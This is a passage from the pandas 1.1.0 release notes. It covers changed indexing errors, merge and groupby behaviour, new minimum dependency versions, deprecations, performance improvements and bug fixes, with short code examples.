ipython\n\n    In [3]: ser1[1.5]\n    ...\n    TypeError: cannot do label indexing on Int64Index with these indexers [1.5] of type float\n\n    In [4] ser1[\"foo\"]\n    ...\n    KeyError: 'foo'\n\n    In [5]: ser1.loc[1.5]\n    ...\n    TypeError: cannot do label indexing on Int64Index with these indexers [1.5] of type float\n\n    In [6]: ser1.loc[\"foo\"]\n    ...\n    KeyError: 'foo'\n\n    In [7]: ser2.loc[1]\n    ...\n    TypeError: cannot do label indexing on DatetimeIndex with these indexers [1] of type int\n\n    In [8]: ser2.loc[pd.Timestamp(0)]\n    ...\n    KeyError: Timestamp('1970-01-01 00:00:00')\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [3]: ser1[1.5]\n    ...\n    KeyError: 1.5\n\n    In [4] ser1[\"foo\"]\n    ...\n    KeyError: 'foo'\n\n    In [5]: ser1.loc[1.5]\n    ...\n    KeyError: 1.5\n\n    In [6]: ser1.loc[\"foo\"]\n    ...\n    KeyError: 'foo'\n\n    In [7]: ser2.loc[1]\n    ...\n    KeyError: 1\n\n    In [8]: ser2.loc[pd.Timestamp(0)]\n    ...\n    KeyError: Timestamp('1970-01-01 00:00:00')\n\n\nSimilarly, :meth:`DataFrame.at` and :meth:`Series.at` will raise a ``TypeError`` instead of a ``ValueError`` if an incompatible key is passed, and ``KeyError`` if a missing key is passed, matching the behavior of ``.loc[]`` (:issue:`31722`)\n\n.. _whatsnew_110.notable_bug_fixes.indexing_int_multiindex_raises_key_errors:\n\nFailed Integer Lookups on MultiIndex Raise KeyError\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\nIndexing with integers with a :class:`MultiIndex` that has an integer-dtype\nfirst level incorrectly failed to raise ``KeyError`` when one or more of\nthose integer keys is not present in the first level of the index (:issue:`33539`)\n\n.. ipython:: python\n\n    idx = pd.Index(range(4))\n    dti = pd.date_range(\"2000-01-03\", periods=3)\n    mi = pd.MultiIndex.from_product([idx, dti])\n    ser = pd.Series(range(len(mi)), index=mi)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [5]: ser[[5]]\n    Out[5]: Series([], dtype: int64)\n\n*New behavior*:\n\n.. code-block:: ipython\n\n    In [5]: ser[[5]]\n    ...\n    KeyError: '[5] not in index'\n\n:meth:`DataFrame.merge` preserves right frame's row order\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n:meth:`DataFrame.merge` now preserves the right frame's row order when executing a right merge (:issue:`27453`)\n\n.. ipython:: python\n\n    left_df = pd.DataFrame({'animal': ['dog', 'pig'],\n                           'max_speed': [40, 11]})\n    right_df = pd.DataFrame({'animal': ['quetzal', 'pig'],\n                            'max_speed': [80, 11]})\n    left_df\n    right_df\n\n*Previous behavior*:\n\n.. code-block:: python\n\n    >>> left_df.merge(right_df, on=['animal', 'max_speed'], how=\"right\")\n        animal  max_speed\n    0      pig         11\n    1  quetzal         80\n\n*New behavior*:\n\n.. ipython:: python\n\n    left_df.merge(right_df, on=['animal', 'max_speed'], how=\"right\")\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_110.notable_bug_fixes.assignment_to_multiple_columns:\n\nAssignment to multiple columns of a DataFrame when some columns do not exist\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nAssignment to multiple columns of a :class:`DataFrame` when some of the columns do not exist would previously assign the values to the last column. Now, new columns will be constructed with the right values. (:issue:`13658`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({'a': [0, 1, 2], 'b': [3, 4, 5]})\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [3]: df[['a', 'c']] = 1\n   In [4]: df\n   Out[4]:\n      a  b\n   0  1  1\n   1  1  1\n   2  1  1\n\n*New behavior*:\n\n.. ipython:: python\n\n   df[['a', 'c']] = 1\n   df\n\n.. _whatsnew_110.notable_bug_fixes.groupby_consistency:\n\nConsistency across groupby reductions\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nUsing :meth:`DataFrame.groupby` with ``as_index=True`` and the aggregation ``nunique`` would include the grouping column(s) in the columns of the result. Now the grouping column(s) only appear in the index, consistent with other reductions. (:issue:`32579`)\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"a\": [\"x\", \"x\", \"y\", \"y\"], \"b\": [1, 1, 2, 3]})\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [3]: df.groupby(\"a\", as_index=True).nunique()\n   Out[4]:\n      a  b\n   a\n   x  1  1\n   y  1  2\n\n*New behavior*:\n\n.. ipython:: python\n\n   df.groupby(\"a\", as_index=True).nunique()\n\nUsing :meth:`DataFrame.groupby` with ``as_index=False`` and the function ``idxmax``, ``idxmin``, ``mad``, ``nunique``, ``sem``, ``skew``, or ``std`` would modify the grouping column. Now the grouping column remains unchanged, consistent with other reductions. (:issue:`21090`, :issue:`10355`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [3]: df.groupby(\"a\", as_index=False).nunique()\n   Out[4]:\n      a  b\n   0  1  1\n   1  1  2\n\n*New behavior*:\n\n.. ipython:: python\n\n   df.groupby(\"a\", as_index=False).nunique()\n\nThe method :meth:`.DataFrameGroupBy.size` would previously ignore ``as_index=False``. Now the grouping columns are returned as columns, making the result a :class:`DataFrame` instead of a :class:`Series`. (:issue:`32599`)\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [3]: df.groupby(\"a\", as_index=False).size()\n   Out[4]:\n   a\n   x    2\n   y    2\n   dtype: int64\n\n*New behavior*:\n\n.. ipython:: python\n\n   df.groupby(\"a\", as_index=False).size()\n\n.. _whatsnew_110.api_breaking.groupby_results_lost_as_index_false:\n\n:meth:`.DataFrameGroupby.agg` lost results with ``as_index=False`` when relabeling columns\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nPreviously :meth:`.DataFrameGroupby.agg` lost the result columns, when the ``as_index`` option was\nset to ``False`` and the result columns were relabeled. In this case the result values were replaced with\nthe previous index (:issue:`32240`).\n\n.. ipython:: python\n\n   df = pd.DataFrame({\"key\": [\"x\", \"y\", \"z\", \"x\", \"y\", \"z\"],\n                      \"val\": [1.0, 0.8, 2.0, 3.0, 3.6, 0.75]})\n   df\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n   In [2]: grouped = df.groupby(\"key\", as_index=False)\n   In [3]: result = grouped.agg(min_val=pd.NamedAgg(column=\"val\", aggfunc=\"min\"))\n   In [4]: result\n   Out[4]:\n        min_val\n    0   x\n    1   y\n    2   z\n\n*New behavior*:\n\n.. ipython:: python\n\n   grouped = df.groupby(\"key\", as_index=False)\n   result = grouped.agg(min_val=pd.NamedAgg(column=\"val\", aggfunc=\"min\"))\n   result\n\n\n.. _whatsnew_110.notable_bug_fixes.apply_applymap_first_once:\n\napply and applymap on ``DataFrame`` evaluates first row/column only once\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\n.. ipython:: python\n\n    df = pd.DataFrame({'a': [1, 2], 'b': [3, 6]})\n\n    def func(row):\n        print(row)\n        return row\n\n*Previous behavior*:\n\n.. code-block:: ipython\n\n    In [4]: df.apply(func, axis=1)\n    a    1\n    b    3\n    Name: 0, dtype: int64\n    a    1\n    b    3\n    Name: 0, dtype: int64\n    a    2\n    b    6\n    Name: 1, dtype: int64\n    Out[4]:\n       a  b\n    0  1  3\n    1  2  6\n\n*New behavior*:\n\n.. ipython:: python\n\n    df.apply(func, axis=1)\n\n.. _whatsnew_110.api_breaking:\n\nBackwards incompatible API changes\n~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n\n.. _whatsnew_110.api_breaking.testing.check_freq:\n\nAdded ``check_freq`` argument to ``testing.assert_frame_equal`` and ``testing.assert_series_equal``\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nThe ``check_freq`` argument was added to :func:`testing.assert_frame_equal` and :func:`testing.assert_series_equal` in pandas 1.1.0 and defaults to ``True``. :func:`testing.assert_frame_equal` and :func:`testing.assert_series_equal` now raise ``AssertionError`` if the indexes do not have the same frequency. Before pandas 1.1.0, the index frequency was not checked.\n\n\nIncreased minimum versions for dependencies\n^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n\nSome minimum supported versions of dependencies were updated (:issue:`33718`, :issue:`29766`, :issue:`29723`, pytables >= 3.4.3).\nIf installed, we now require:\n\n+-----------------+-----------------+----------+---------+\n| Package         | Minimum Version | Required | Changed |\n+=================+=================+==========+=========+\n| numpy           | 1.15.4          |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| pytz            | 2015.4          |    X     |         |\n+-----------------+-----------------+----------+---------+\n| python-dateutil | 2.7.3           |    X     |    X    |\n+-----------------+-----------------+----------+---------+\n| bottleneck      | 1.2.1           |          |         |\n+-----------------+-----------------+----------+---------+\n| numexpr         | 2.6.2           |          |         |\n+-----------------+-----------------+----------+---------+\n| pytest (dev)    | 4.0.2           |          |         |\n+-----------------+-----------------+----------+---------+\n\nFor `optional libraries <https://pandas.pydata.org/docs/getting_started/install.html>`_ the general recommendation is to use the latest version.\nThe following table lists the lowest version per library that is currently being tested throughout the development of pandas.\nOptional libraries below the lowest tested version may still work, but are not considered supported.\n\n+-----------------+-----------------+---------+\n| Package         | Minimum Version | Changed |\n+=================+=================+=========+\n| beautifulsoup4  | 4.6.0           |         |\n+-----------------+-----------------+---------+\n| fastparquet     | 0.3.2           |         |\n+-----------------+-----------------+---------+\n| fsspec          | 0.7.4           |         |\n+-----------------+-----------------+---------+\n| gcsfs           | 0.6.0           |    X    |\n+-----------------+-----------------+---------+\n| lxml            | 3.8.0           |         |\n+-----------------+-----------------+---------+\n| matplotlib      | 2.2.2           |         |\n+-----------------+-----------------+---------+\n| numba           | 0.46.0          |         |\n+-----------------+-----------------+---------+\n| openpyxl        | 2.5.7           |         |\n+-----------------+-----------------+---------+\n| pyarrow         | 0.13.0          |         |\n+-----------------+-----------------+---------+\n| pymysql         | 0.7.1           |         |\n+-----------------+-----------------+---------+\n| pytables        | 3.4.3           |    X    |\n+-----------------+-----------------+---------+\n| s3fs            | 0.4.0           |    X    |\n+-----------------+-----------------+---------+\n| scipy           | 1.2.0           |    X    |\n+-----------------+-----------------+---------+\n| sqlalchemy      | 1.1.4           |         |\n+-----------------+-----------------+---------+\n| xarray          | 0.8.2           |         |\n+-----------------+-----------------+---------+\n| xlrd            | 1.1.0           |         |\n+-----------------+-----------------+---------+\n| xlsxwriter      | 0.9.8           |         |\n+-----------------+-----------------+---------+\n| xlwt            | 1.2.0           |         |\n+-----------------+-----------------+---------+\n| pandas-gbq      | 1.2.0           |    X    |\n+-----------------+-----------------+---------+\n\nSee :ref:`install.dependencies` and :ref:`install.optional_dependencies` for more.\n\nDevelopment changes\n^^^^^^^^^^^^^^^^^^^\n\n- The minimum version of Cython is now the most recent bug-fix version (0.29.16) (:issue:`33334`).\n\n\n.. _whatsnew_110.deprecations:\n\nDeprecations\n~~~~~~~~~~~~\n\n- Lookups on a :class:`Series` with a single-item list containing a slice (e.g. ``ser[[slice(0, 4)]]``) are deprecated and will raise in a future version.  Either convert the list to a tuple, or pass the slice directly instead (:issue:`31333`)\n\n- :meth:`DataFrame.mean` and :meth:`DataFrame.median` with ``numeric_only=None`` will include ``datetime64`` and ``datetime64tz`` columns in a future version (:issue:`29941`)\n- Setting values with ``.loc`` using a positional slice is deprecated and will raise in a future version.  Use ``.loc`` with labels or ``.iloc`` with positions instead (:issue:`31840`)\n- :meth:`DataFrame.to_dict` has deprecated accepting short names for ``orient`` and will raise in a future version (:issue:`32515`)\n- :meth:`Categorical.to_dense` is deprecated and will be removed in a future version, use ``np.asarray(cat)`` instead (:issue:`32639`)\n- The ``fastpath`` keyword in the ``SingleBlockManager`` constructor is deprecated and will be removed in a future version (:issue:`33092`)\n- Providing ``suffixes`` as a ``set`` in :func:`pandas.merge` is deprecated. Provide a tuple instead (:issue:`33740`, :issue:`34741`).\n- Indexing a :class:`Series` with a multi-dimensional indexer like ``[:, None]`` to return an ``ndarray`` now raises a ``FutureWarning``. Convert to a NumPy array before indexing instead (:issue:`27837`)\n- :meth:`Index.is_mixed` is deprecated and will be removed in a future version, check ``index.inferred_type`` directly instead (:issue:`32922`)\n\n- Passing any arguments but the first one to :func:`read_html` as\n  positional arguments is deprecated. All other\n  arguments should be given as keyword arguments (:issue:`27573`).\n\n- Passing any arguments but ``path_or_buf`` (the first one) to\n  :func:`read_json` as positional arguments is deprecated. All\n  other arguments should be given as keyword arguments (:issue:`27573`).\n\n- Passing any arguments but the first two to :func:`read_excel` as\n  positional arguments is deprecated. All other\n  arguments should be given as keyword arguments (:issue:`27573`).\n\n- :func:`pandas.api.types.is_categorical` is deprecated and will be removed in a future version; use :func:`pandas.api.types.is_categorical_dtype` instead (:issue:`33385`)\n- :meth:`Index.get_value` is deprecated and will be removed in a future version (:issue:`19728`)\n- :meth:`Series.dt.week` and :meth:`Series.dt.weekofyear` are deprecated and will be removed in a future version, use :meth:`Series.dt.isocalendar().week` instead (:issue:`33595`)\n- :meth:`DatetimeIndex.week` and ``DatetimeIndex.weekofyear`` are deprecated and will be removed in a future version, use ``DatetimeIndex.isocalendar().week`` instead (:issue:`33595`)\n- :meth:`DatetimeArray.week` and ``DatetimeArray.weekofyear`` are deprecated and will be removed in a future version, use ``DatetimeArray.isocalendar().week`` instead (:issue:`33595`)\n- :meth:`DateOffset.__call__` is deprecated and will be removed in a future version, use ``offset + other`` instead (:issue:`34171`)\n- :meth:`~pandas.tseries.offsets.BusinessDay.apply_index` is deprecated and will be removed in a future version. Use ``offset + other`` instead (:issue:`34580`)\n- :meth:`DataFrame.tshift` and :meth:`Series.tshift` are deprecated and will be removed in a future version, use :meth:`DataFrame.shift` and :meth:`Series.shift` instead (:issue:`11631`)\n- Indexing an :class:`Index` object with a float key is deprecated, and will\n  raise an ``IndexError`` in the future. You can manually convert to an integer key\n  instead (:issue:`34191`).\n- The ``squeeze`` keyword in :meth:`~DataFrame.groupby` is deprecated and will be removed in a future version (:issue:`32380`)\n- The ``tz`` keyword in :meth:`Period.to_timestamp` is deprecated and will be removed in a future version; use ``per.to_timestamp(...).tz_localize(tz)`` instead (:issue:`34522`)\n- :meth:`DatetimeIndex.to_perioddelta` is deprecated and will be removed in a future version.  Use ``index - index.to_period(freq).to_timestamp()`` instead (:issue:`34853`)\n- :meth:`DataFrame.melt` accepting a ``value_name`` that already exists is deprecated, and will be removed in a future version (:issue:`34731`)\n- The ``center`` keyword in the :meth:`DataFrame.expanding` function is deprecated and will be removed in a future version (:issue:`20647`)\n\n\n\n.. ---------------------------------------------------------------------------\n\n\n.. _whatsnew_110.performance:\n\nPerformance improvements\n~~~~~~~~~~~~~~~~~~~~~~~~\n\n- Performance improvement in :class:`Timedelta` constructor (:issue:`30543`)\n- Performance improvement in :class:`Timestamp` constructor (:issue:`30543`)\n- Performance improvement in flex arithmetic ops between :class:`DataFrame` and :class:`Series` with ``axis=0`` (:issue:`31296`)\n- Performance improvement in arithmetic ops between :class:`DataFrame` and :class:`Series` with ``axis=1`` (:issue:`33600`)\n- The internal index method :meth:`~Index._shallow_copy` now copies cached attributes over to the new index,\n  avoiding creating these again on the new index. This can speed up many operations that depend on creating copies of\n  existing indexes (:issue:`28584`, :issue:`32640`, :issue:`32669`)\n- Significant performance improvement when creating a :class:`DataFrame` with\n  sparse values from ``scipy.sparse`` matrices using the\n  :meth:`DataFrame.sparse.from_spmatrix` constructor (:issue:`32821`,\n  :issue:`32825`,  :issue:`32826`, :issue:`32856`, :issue:`32858`).\n- Performance improvement for groupby methods :meth:`.Groupby.first`\n  and :meth:`.Groupby.last` (:issue:`34178`)\n- Performance improvement in :func:`factorize` for nullable (integer and Boolean) dtypes (:issue:`33064`).\n- Performance improvement when constructing :class:`Categorical` objects (:issue:`33921`)\n- Fixed performance regression in :func:`pandas.qcut` and :func:`pandas.cut` (:issue:`33921`)\n- Performance improvement in reductions (``sum``, ``prod``, ``min``, ``max``) for nullable (integer and Boolean) dtypes (:issue:`30982`, :issue:`33261`, :issue:`33442`).\n- Performance improvement in arithmetic operations between two :class:`DataFrame` objects (:issue:`32779`)\n- Performance improvement in :class:`.RollingGroupby` (:issue:`34052`)\n- Performance improvement in arithmetic operations (``sub``, ``add``, ``mul``, ``div``) for :class:`MultiIndex` (:issue:`34297`)\n- Performance improvement in ``DataFrame[bool_indexer]`` when ``bool_indexer`` is a ``list`` (:issue:`33924`)\n- Significant performance improvement of :meth:`io.formats.style.Styler.render` with styles added with various ways such as :meth:`io.formats.style.Styler.apply`, :meth:`io.formats.style.Styler.applymap` or :meth:`io.formats.style.Styler.bar` (:issue:`19917`)\n\n.. ---------------------------------------------------------------------------\n\n.. _whatsnew_110.bug_fixes:\n\nBug fixes\n~~~~~~~~~\n\n\nCategorical\n^^^^^^^^^^^\n\n- Passing an invalid ``fill_value`` to :meth:`Categorical.take` raises a ``ValueError`` instead of ``TypeError`` (:issue:`33660`)\n- Combining a :class:`Categorical` with integer categories and which contains missing values with a float dtype column in operations such as :func:`concat` or :meth:`~DataFrame.append` will now result in a float column instead of an object dtype column (:issue:`33607`)\n- Bug where :func:`merge` was unable to join on non-unique categorical indices (:issue:`28189`)\n- Bug when passing categorical data to :class:`Index` constructor along with ``dtype=object`` incorrectly returning a :class:`CategoricalIndex` instead of object-dtype :class:`Index` (:issue:`32167`)\n- Bug where :class:`Categorical` comparison operator ``__ne__`` would incorrectly evaluate to ``False`` when either element was missing (:issue:`32276`)\n- :meth:`Categorical.fillna` now accepts :class:`Categorical` ``other`` argument (:issue:`32420`)\n- Repr of :class:`Categorical` was not distinguishing between ``int`` and ``str`` (:issue:`33676`)\n\nDatetimelike\n^^^^^^^^^^^^\n\n- Passing an integer dtype other than ``int64`` to ``np.array(period_index, dtype=...)`` will now raise ``TypeError`` instead of incorrectly using ``int64`` (:issue:`32255`)\n- :meth:`Series.to_timestamp` now raises a ``TypeError`` if the axis is not a :class:`PeriodIndex`. Previously an ``AttributeError`` was raised (:issue:`33327`)\n- :meth:`Series.to_period` now raises a ``TypeError`` if the axis is not a :class:`DatetimeIndex`. Previously an ``AttributeError`` was raised (:issue:`33327`)\n- :class:`Period` no longer accepts tuples for the ``freq`` argument (:issue:`34658`)\n- Bug in :class:`Timestamp` where constructing a :class:`Timestamp` from ambiguous epoch time and calling constructor again changed the :meth:`Timestamp.value` property (:issue:`24329`)\n- :meth:`DatetimeArray.searchsorted`, :meth:`TimedeltaArray.searchsorted`, :meth:`PeriodArray.searchsorted` not recognizing non-pandas scalars and incorrectly raising ``ValueError`` instead of ``TypeError`` (:issue:`30950`)\n- Bug in :class:`Timestamp` where constructing :class:`Timestamp` with dateutil timezone less than 128 nanoseconds before daylight saving time switch from winter to summer would result in nonexistent time (:issue:`31043`)\n- Bug in :meth:`Period.to_timestamp`, :meth:`Period.start_time` with microsecond frequency returning a timestamp one nanosecond earlier than the correct time (:issue:`31475`)\n- :class:`Timestamp` raised a confusing error message when year, month or day is missing (:issue:`31200`)\n- Bug in :class:`DatetimeIndex` constructor incorrectly accepting ``bool``-dtype inputs (:issue:`32668`)\n- Bug in :meth:`DatetimeIndex.searchsorted` not accepting a ``list`` or :class:`Series` as its argument (:issue:`32762`)\n- Bug where :meth:`PeriodIndex` raised when passed a :class:`Series` of strings (:issue:`26109`)\n- Bug in :class:`Timestamp` arithmetic when adding or subtracting an ``np.ndarray`` with ``timedelta64`` dtype (:issue:`33296`)\n- Bug in :meth:`DatetimeIndex.to_period` not inferring the frequency when called with no arguments (:issue:`33358`)\n- Bug in :meth:`DatetimeIndex.tz_localize` incorrectly retaining ``freq`` in some cases where the original ``freq`` is no longer valid (:issue:`30511`)\n- Bug in :meth:`DatetimeIndex.intersection` losing ``freq`` and timezone in some cases (:issue:`33604`)\n- Bug in :meth:`DatetimeIndex.get_indexer` where incorrect output would be returned for mixed datetime-like targets (:issue:`33741`)\n- Bug in :class:`DatetimeIndex` addition and subtraction with some types of :class:`DateOffset` objects incorrectly retaining an invalid ``freq`` attribute (:issue:`33779`)\n- Bug in :class:`DatetimeIndex` where setting the ``freq`` attribute on an index could silently change the ``freq`` attribute on another index viewing the same data (:issue:`33552`)\n- :meth:`DataFrame.min` and :meth:`DataFrame.max` were not returning consistent results with :meth:`Series.min` and :meth:`Series.max` when called on objects initialized with empty :func:`pd.to_datetime`\n- Bug in :meth:`DatetimeIndex.intersection` and :meth:`TimedeltaIndex.intersection` with results not having the correct ``name`` attribute (:issue:`33904`)\n- Bug in :meth:`DatetimeArray.__setitem__`, :meth:`TimedeltaArray.__setitem__`, :meth:`PeriodArray.__setitem__` incorrectly allowing values with ``int64`` dtype to be silently cast (:issue:`33717`)\n- Bug in subtracting :class:`TimedeltaIndex` from :class:`Period` incorrectly raising ``TypeError`` in some cases where it should succeed and ``IncompatibleFrequency`` in some cases where it should raise ``TypeError`` (:issue:`33883`)\n- Bug in constructing a :class:`Series` or :class:`Index` from a read-only NumPy array with non-ns\n  resolution which converted to object dtype instead of coercing to ``datetime64[ns]``\n  dtype when within the timestamp bounds (:issue:`34843`).\n- The ``freq`` keyword in :class:`Period`, :func:`date_range`, :func:`period_range`, :func:`pd.tseries.frequencies.to_offset` no longer allows tuples, pass as string instead (:issue:`34703`)\n- Bug in :meth:`DataFrame.append` when appending a :class:`Series` containing a scalar tz-aware :class:`Timestamp` to an empty :class:`DataFrame` resulted in an object column instead of ``datetime64[ns, tz]`` dtype (:issue:`35038`)\n- ``OutOfBoundsDatetime`` issues an improved error message when timestamp is out of implementation bounds. (:issue:`32967`)\n- Bug in :meth:`AbstractHolidayCalendar.holidays` when no rules were defined (:issue:`31415`)\n- Bug in :class:`Tick` comparisons raising ``TypeError`` when comparing against timedelta-like objects (:issue:`34088`)\n- Bug in :class:`Tick` multiplication raising ``TypeError`` when multiplying by a float (:issue:`34486`)\n\nTimedelta\n^^^^^^^^^\n\n- Bug in constructing a :class:`Timedelta` with a high precision integer that would round the :class:`Timedelta` components (:issue:`31354`)\n- Bug in dividing ``np.nan`` or ``None`` by :class:`Timedelta` incorrectly returning ``NaT`` (:issue:`31869`)\n- :class:`Timedelta` now understands ``\u00c2\u00b5s`` as an identifier for microsecond (:issue:`32899`)\n- :class:`Timedelta` string representation now includes nanoseconds, when nanoseconds are non-zero (:issue:`9309`)\n- Bug in comparing a :class:`Timedelta` object against an ``np.ndarray`` with ``timedelta64`` dtype incorrectly viewing all entries as unequal (:issue:`33441`)\n- Bug in :func:`timedelta_range` that produced an extra point on a edge case (:issue:`30353`, :issue:`33498`)\n- Bug in :meth:`DataFrame.resample` that produced an extra point on a edge case (:issue:`30353`, :issue:`13022`, :issue:`33498`)\n- Bug in :meth:`DataFrame.resample` that ignored the ``loffset`` argument when dealing with timedelta (:issue:`7687`, :issue:`33498`)\n- Bug in :class:`Timedelta` and :func:`pandas.to_timedelta` that ignored the ``unit`` argument for string input (:issue:`12136`)\n\nTimezones\n^^^^^^^^^\n\n- Bug in :func:`to_datetime` with ``infer_datetime_format=True`` where timezone names (e.g. ``UTC``) would not be parsed correctly (:issue:`33133`)\n\n\nNumeric\n^^^^^^^\n- Bug in :meth:`DataFrame.floordiv` with ``axis=0`` not treating division-by-zero like :meth:`Series.floordiv` (:issue:`31271`)\n- Bug in :func:`to_numeric` with string argument ``\"uint64\"`` and ``errors=\"coerce\"`` silently fails (:issue:`32394`)\n- Bug in :func:`to_numeric` with ``downcast=\"unsigned\"`` fails for empty data (:issue:`32493`)\n- Bug in :meth:`DataFrame.mean` with ``numeric_only=False`` and either ``datetime64`` dtype or ``PeriodDtype`` column incorrectly raising ``TypeError`` (:issue:`32426`)\n- Bug in :meth:`DataFrame.count` with ``level=\"foo\"`` and index level ``\"foo\"`` containing NaNs causes segmentation fault (:issue:`21824`)\n- Bug in :meth:`DataFrame.diff` with ``axis=1`` returning incorrect results with mixed dtypes (:issue:`32995`)\n- Bug in :meth:`DataFrame.corr` and :meth:`DataFrame.cov` raising when handling nullable integer columns with ``pandas.NA`` (:issue:`33803`)\n- Bug in arithmetic operations between :class:`DataFrame` objects with non-overlapping columns with duplicate labels causing an infinite loop (:issue:`35194`)\n- Bug in :class:`DataFrame` and :class:`Series` addition and subtraction between object-dtype objects and ``datetime64`` dtype objects (:issue:`33824`)\n- Bug in :meth:`Index.difference` giving incorrect results when comparing a :class:`Float64Index` and object :class:`Index` (:issue:`35217`)\n- Bug in :class:`DataFrame` reductions (e.g. ``df.min()``, ``df.max()``) with ``ExtensionArray`` dtypes (:issue:`34520`, :issue:`32651`)\n- :meth:`Series.interpolate` and :meth:`DataFrame.interpolate` now raise a ValueError if ``limit_direction`` is ``'forward'`` or ``'both'`` and ``method`` is ``'backfill'`` or ``'bfill'`` or ``limit_direction`` is ``'backward'`` or ``'both'`` and ``method`` is ``'pad'`` or ``'ffill'`` (:issue:`34746`)\n\nConversion\n^^^^^^^^^^\n- Bug in :class:`Series` construction from NumPy array with big-endian ``datetime64`` dtype (:issue:`29684`)\n- Bug in :class:`Timedelta` construction with large nanoseconds keyword value (:issue:`32402`)\n- Bug in :class:`DataFrame` construction where sets would be duplicated rather than raising (:issue:`32582`)\n- The :class:`DataFrame` constructor no longer accepts a list of :class:`DataFrame` objects. Because of changes to NumPy, :class:`DataFrame` objects are now consistently treated as 2D objects, so a list of :class:`DataFrame` objects is considered 3D, and no longer acceptable for the :class:`DataFrame` constructor (:issue:`32289`).\n- Bug in :class:`DataFrame` when initiating a frame with lists and assign ``columns`` with nested list for ``MultiIndex`` (:issue:`32173`)\n- Improved error message for invalid construction of list when creating a new index (:issue:`35190`)\n\n\nStrings\n^^^^^^^\n\n- Bug in the :meth:`~Series.astype` method when converting \"string\" dtype data to nullable integer dtype (:issue:`32450`).\n- Fixed issue where taking ``min`` or ``max`` of a ``StringArray`` or ``Series`` with ``StringDtype`` type would raise. (:issue:`31746`)\n- Bug in :meth:`Series.str.cat` returning ``NaN`` output when other had :class:`Index` type (:issue:`33425`)\n- :func:`pandas.api.dtypes.is_string_dtype` no longer incorrectly identifies categorical series as string.\n\nInterval\n^^^^^^^^\n- Bug in :class:`IntervalArray` incorrectly allowing the underlying data to be changed when setting values (:issue:`32782`)\n\nIndexing\n^^^^^^^^\n\n- :meth:`DataFrame.xs` now raises a  ``TypeError`` if a ``level`` keyword is supplied and the axis is not a :class:`MultiIndex`. Previously an ``AttributeError`` was raised (:issue:`33610`)\n- Bug in slicing on a :class:`DatetimeIndex` with a partial-timestamp dropping high-resolution indices near the end of a year, quarter, or month (:issue:`31064`)\n- Bug in :meth:`PeriodIndex.get_loc` treating higher-resolution strings differently from :meth:`PeriodIndex.get_value` (:issue:`31172`)\n- Bug in :meth:`Series.at` and :meth:`DataFrame.at` not matching ``.loc`` behavior when looking up an integer in a :class:`Float64Index` (:issue:`31329`)\n- Bug in :meth:`PeriodIndex.is_monotonic` incorrectly returning ``True`` when containing leading ``NaT`` entries (:issue:`31437`)\n- Bug in :meth:`DatetimeIndex.get_loc` raising ``KeyError`` with converted-integer key instead of the user-passed key (:issue:`31425`)\n- Bug in :meth:`Series.xs` incorrectly returning ``Timestamp`` instead of ``datetime64`` in some object-dtype cases (:issue:`31630`)\n- Bug in :meth:`DataFrame.iat` incorrectly returning ``Timestamp`` instead of ``datetime`` in some object-dtype cases (:issue:`32809`)\n- Bug in :meth:`DataFrame.at` when either columns or index is non-unique (:issue:`33041`)\n- Bug in :meth:`Series.loc` and :meth:`DataFrame.loc` when indexing with an integer key on a object-dtype :class:`Index` that is not all-integers (:issue:`31905`)\n- Bug in :meth:`DataFrame.iloc.__setitem__` on a :class:`DataFrame` with duplicate columns incorrectly setting values for all matching columns (:issue:`15686`, :issue:`22036`)\n- Bug in :meth:`DataFrame.loc` and :meth:`Series.loc` with a :class:`DatetimeIndex`, :class:`TimedeltaIndex`, or :class:`PeriodIndex` incorrectly allowing lookups of non-matching datetime-like dtypes (:issue:`32650`)\n- Bug in :meth:`Series.__getitem__` indexing with non-standard scalars, e.g. ``np.dtype`` (:issue:`32684`)\n- Bug in :class:`Index` constructor where an unhelpful error message was raised for NumPy scalars (:issue:`33017`)\n- Bug in :meth:`DataFrame.lookup` incorrectly raising an ``AttributeError`` when ``frame.index`` or ``frame.columns`` is not unique; this will now raise a ``ValueError`` with a helpful error message (:issue:`33041`)\n- Bug in :class:`Interval` where a :class:`Timedelta` could not be added or subtracted from a :class:`Timestamp` interval (:issue:`32023`)\n- Bug in :meth:`DataFrame.copy` not invalidating _item_cache after copy caused post-copy value updates to not be reflected (:issue:`31784`)\n- Fixed regression in :meth:`DataFrame.loc` and :meth:`Series.loc` throwing an error when a ``datetime64[ns, tz]`` value is provided (:issue:`32395`)\n- Bug in :meth:`Series.__getitem__` with an integer key and a :class:`MultiIndex` with leading integer level failing to raise ``KeyError`` if the key is not present in the first level (:issue:`33355`)\n- Bug in :meth:`DataFrame.iloc` when slicing a single column :class:`DataFrame` with ``ExtensionDtype`` (e.g. ``df.iloc[:, :1]``) returning an invalid result (:issue:`32957`)\n- Bug in :meth:`DatetimeIndex.insert` and :meth:`TimedeltaIndex.insert` causing index ``freq`` to be lost when setting an element into an empty :class:`Series` 